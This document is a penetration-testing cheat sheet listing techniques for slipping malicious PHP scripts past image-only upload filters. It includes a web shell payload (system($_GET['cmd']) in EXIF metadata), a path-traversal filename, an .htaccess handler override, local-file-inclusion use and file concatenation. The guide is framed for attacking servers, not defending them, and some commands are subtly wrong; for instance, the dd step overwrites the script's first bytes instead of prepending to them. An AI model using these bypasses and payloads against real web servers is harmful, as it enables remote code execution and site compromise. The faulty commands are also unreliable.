# Bypassing Image-Only Upload Functionality

When performing penetration testing, one common challenge is bypassing file upload restrictions. This document details various techniques to bypass image-only upload functionality, allowing you to upload malicious PHP scripts to a web server.

## 1. File Extension Manipulation

### Double Extension
**Goal**: Bypass file extension validation by using a double extension.

**Steps**:
1. Create a PHP file `exploit.php` containing malicious code.
2. Rename it to `image.jpg.php`.
3. Upload `image.jpg.php`.

**Outcome**: The server may accept the file if it only checks the extension after the last period.

### Alternate Extensions
**Goal**: Use alternative PHP extensions.

**Steps**:
1. Rename `exploit.php` to `image.php5`.
2. Upload `image.php5`.

**Outcome**: The server may interpret the file as a PHP script.

### Case Sensitivity
**Goal**: Use different case variations of the PHP extension.

**Steps**:
1. Rename `exploit.php` to `image.JPG.PHP`.
2. Upload `image.JPG.PHP`.

**Outcome**: Some servers may not handle case sensitivity properly.

## 2. Content-Type Header Manipulation

### Change MIME Type
**Goal**: Trick the server by changing the MIME type to an image.

**Steps**:
1. Intercept the upload request using Burp Suite.
2. Modify the `Content-Type` header to `image/jpeg`.
3. Forward the request.

**Outcome**: The server may accept the file based on the modified MIME type.

## 3. Magic Bytes Injection

### Add Image Magic Bytes
**Goal**: Prepend image magic bytes to a PHP file.

**Steps**:
1. Create `exploit.php` with your PHP code.
2. Prepend JPEG magic bytes using a hex editor or command line:
   ```bash
   printf '\xFF\xD8\xFF' | dd conv=notrunc of=exploit.php bs=1 seek=0
   ```
3. Upload `exploit.php`.

**Outcome**: The server may accept the file as an image.

## 4. Null Byte Injection

### Truncate File Names
**Goal**: Use a null byte to truncate the file extension.

**Steps**:
1. Rename `exploit.php` to `image.jpg%00.php`.
2. Upload `image.jpg%00.php`.

**Outcome**: Some servers may interpret the file name up to the null byte.

## 5. Server-Side Validation Bypass

### Disable JavaScript Validation
**Goal**: Bypass client-side validation.

**Steps**:
1. Disable JavaScript in your browser or intercept the request using Burp Suite.
2. Upload `exploit.php` directly.

**Outcome**: The server may not perform adequate validation if it relies on client-side checks.

## 6. Metadata Injection

### Embed Scripts in Metadata
**Goal**: Inject PHP code into image metadata.

**Steps**:
1. Use ExifTool to add PHP code to image metadata:
   ```bash
   exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg
   ```
2. Upload `image.jpg`.

**Outcome**: The server might process the PHP code embedded in the metadata.

## 7. Path Traversal

### Directory Traversal
**Goal**: Upload files to unintended directories.

**Steps**:
1. Rename `exploit.php` to `../../../../var/www/html/uploads/exploit.php`.
2. Upload the file.

**Outcome**: If the server is vulnerable to path traversal, it might save the file in an executable directory.

## 8. HTAccess/Configuration Files

### Upload .htaccess File
**Goal**: Configure the server to execute PHP code in the upload directory.

**Steps**:
1. Create a `.htaccess` file containing:
   ```
   AddType application/x-httpd-php .jpg
   ```
2. Upload `.htaccess`.

**Outcome**: The server might interpret all `.jpg` files as PHP scripts.

## 9. Exploiting File Inclusion

### Local File Inclusion (LFI)
**Goal**: Use LFI to execute the uploaded script.

**Steps**:
1. Upload `exploit.php` as `image.jpg`.
2. Find an LFI vulnerability and include the uploaded file:
   ```
   http://example.com/index.php?page=uploads/image.jpg
   ```

**Outcome**: The server includes and executes the PHP script.

## 10. Embedding PHP in Image Files

### Concatenate Files
**Goal**: Embed PHP code in an image file.

**Steps**:
1. Concatenate an image and PHP file:
   ```bash
   cat image.jpg exploit.php > payload.php
   ```
2. Upload `payload.php`.

**Outcome**: The server might see the initial image bytes and accept the file.

## Practical Tools and Commands

### Burp Suite
- **Intercept**: Use Burp Suite to intercept, modify, and replay HTTP requests.

### Hex Editor
- **Hexedit**: Use hex editors like `hexedit` for manual byte manipulation.

### ExifTool
- **Metadata Manipulation**: Use ExifTool to modify image metadata.

### Command Line
- **Concatenation**: Use commands like `cat`, `dd`, and `printf` for file manipulations.

### Example Commands

#### Change Magic Bytes
```bash
printf '\xFF\xD8\xFF' | dd conv=notrunc of=exploit.php bs=1 seek=0
```

#### Concatenate Files
```bash
cat image.jpg exploit.php > payload.php
```